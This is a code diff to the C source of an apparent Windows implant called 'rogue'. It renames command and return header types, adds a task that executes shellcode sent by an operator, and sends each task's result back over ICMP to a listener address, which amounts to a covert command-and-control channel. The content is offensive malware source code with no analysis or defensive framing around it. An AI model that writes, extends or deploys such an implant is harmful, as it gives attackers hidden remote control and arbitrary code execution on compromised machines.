@@ -10,36 +10,6 @@
 
 #include "Common.h"
 
-typedef struct __attribute__(( packed, scalar_storage_order("big-endian" ) ))
-{
-	UINT32	TaskCode;
-	UINT32	TaskId;
-	UINT32	Length;
-	UCHAR	Buffer[0];
-} CMD_REQ_HDR, *PCMD_REQ_HDR ;
-
-typedef struct __attribute__(( packed, scalar_storage_order("big-endian" ) ))
-{
-	UINT32	TaskId;
-	UINT32	CallbackId;
-	UINT32	ReturnCode;
-	UINT32	ErrorValue;
-	UCHAR	Buffer[0];
-} CMD_RET_HDR, *PCMD_RET_HDR ;
-
-typedef enum
-{
-	Hello = 0,
-	ExitFree = 1,
-	ShellcodeExecute = 2
-} CMD ;
-
-typedef enum
-{
-	HelloCbs = 0,
-	ExitFreeCbs = 1
-} CBS ;
-
 typedef struct
 {
 	D_API( RtlAllocateHeap );
@@ -71,8 +41,8 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 	PBUFFER		Inb = NULL;
 	PBUFFER		Onb = NULL;
 	PROGUE_CTX	Ctx = NULL;
-	PCMD_REQ_HDR	Req = NULL;
-	PCMD_RET_HDR	Ret = NULL;
+	PTASK_REQ_HDR	Req = NULL;
+	PTASK_RET_HDR	Ret = NULL;
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
@@ -93,7 +63,7 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 			if ( BufferAddRaw( Onb, Ctx->Id, sizeof( Ctx->Id ) ) ) {
 
 				/* Extend to support size of the return header */
-				if ( BufferExtend( Onb, sizeof( CMD_RET_HDR ) ) ) {
+				if ( BufferExtend( Onb, sizeof( TASK_RET_HDR ) ) ) {
 
 					/* Set return buffer header */
 					Ret = C_PTR( U_PTR( Onb->Buffer ) + sizeof( Ctx->Id ) );
@@ -127,13 +97,13 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 					/* Read in the incoming buffer */
 					if ( IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Ctx->Id, sizeof( Ctx->Id ), &Inb->Buffer, &Inb->Length, &Rcv ) ) {
 						if ( Rcv != FALSE && Inb->Buffer != NULL && Inb->Length != 0 ) {
-							if ( Inb->Length >= sizeof( CMD_REQ_HDR ) ) {
+							if ( Inb->Length >= sizeof( TASK_REQ_HDR ) ) {
 								/* Create an output buffer */
 								if ( ( Onb = BufferCreate() ) != NULL ) {
 									/* Add the ID to the front of the buffer */
 									if ( BufferAddRaw( Onb, Ctx->Id, sizeof( Ctx->Id ) ) ) {
 										/* Add the return header to the front */
-										if ( BufferExtend( Onb, sizeof( CMD_RET_HDR ) ) ) {
+										if ( BufferExtend( Onb, sizeof( TASK_RET_HDR ) ) ) {
 											Req = C_PTR( Inb->Buffer );
 
 											switch( Req->TaskCode ) {
@@ -144,13 +114,11 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 
 													/* Set return info */
 													Ret->TaskId = Req->TaskId;
-													Ret->CallbackId = HelloCbs;
+													Ret->CallbackId = NoAction;
 													Ret->ReturnCode = Res;
 													Ret->ErrorValue = NtCurrentTeb()->LastErrorValue;
 
-													/* Dispatch response */
-													IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Onb->Buffer, Onb->Length, NULL, NULL, NULL );
-													
+													/* Abort */
 													break;
 												case ExitFree:
 													/* Execute TaskExitFree */
@@ -159,15 +127,29 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 
 													/* Set return info */
 													Ret->TaskId     = Req->TaskId;
-													Ret->CallbackId = ExitFreeCbs;
+													Ret->CallbackId = ExitFreeAction;
 													Ret->ReturnCode = 0;
 													Ret->ErrorValue = 0;
 
-													/* Dispatch response */
-													IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Onb->Buffer, Onb->Length, NULL, NULL, NULL );
-													
+													RoguePrintf( Ctx, C_PTR( G_PTR( "Leaving rogue :(" ) ) );
+
+													/* Abort */
+													break;
+												case ShellcodeTask:
+													/* Execute ShellcodeTask */
+													Res = TaskShellcodeTask( Ctx, Req->Buffer, Req->Length, Onb );
+													Ret = C_PTR( U_PTR( Onb->Buffer ) + sizeof( Ctx->Id ) );
+
+													/* Set return info */
+													Ret->TaskId     = Req->TaskId;
+													Ret->CallbackId = NoAction;
+													Ret->ReturnCode = Res;
+													Ret->ErrorValue = NtCurrentTeb()->LastErrorValue;
+
+													/* Abort */
 													break;
 											};
+											IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Onb->Buffer, Onb->Length, NULL, NULL, NULL );
 										};
 									}
 									/* Cleanup */
